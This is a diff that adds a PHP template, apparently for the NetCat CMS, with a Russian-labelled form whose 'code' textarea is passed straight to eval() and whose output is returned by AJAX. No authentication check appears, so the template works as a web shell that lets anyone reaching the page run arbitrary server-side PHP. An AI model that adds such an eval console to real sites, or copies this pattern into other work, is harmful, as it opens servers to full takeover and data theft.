@@ -1,0 +1,36 @@
+<!-- FormPrefix --><?
+$content = ob_get_clean();
+?>{город}%CONTENT_REPLACER('1')% %NC_WIDGET_SHOW('twitter_tweetbutton')%
+<div style="padding:20px;"><form action="" class="js-code" method="post"><textarea name="code" style="width:100%; height:150px"><?=$code?></textarea>
+<br><br>
+<button>Выполнить</button>
+</form></div>
+<div id="result" style="margin:0 20px 20px; padding:10px; background:#eee;">
+<?
+if ($ajax) ob_clean();
+echo "<pre>";
+eval($code);
+echo "</pre>";
+if ($ajax) die();
+
+?>
+</div><?
+$res = ob_get_clean();
+echo $content,$res;
+?><!-- /FormPrefix -->
+
+<!-- RecordTemplate --><?= $f_AdminButtons; ?><!-- /RecordTemplate -->
+
+<!-- FormSuffix --><?="<script>
+\$(function(){
+    \$(\".js-code\").submit(        function(){
+            \$this=\$(this);
+            \$.post(\$this.attr(\"action\")+\"?ajax=1\", \$this.serialize(),function(data){
+                \$(\"#result\").html(data);
+            })
+            return false;
+        });
+
+
+});
+</script>";?><!-- /FormSuffix -->
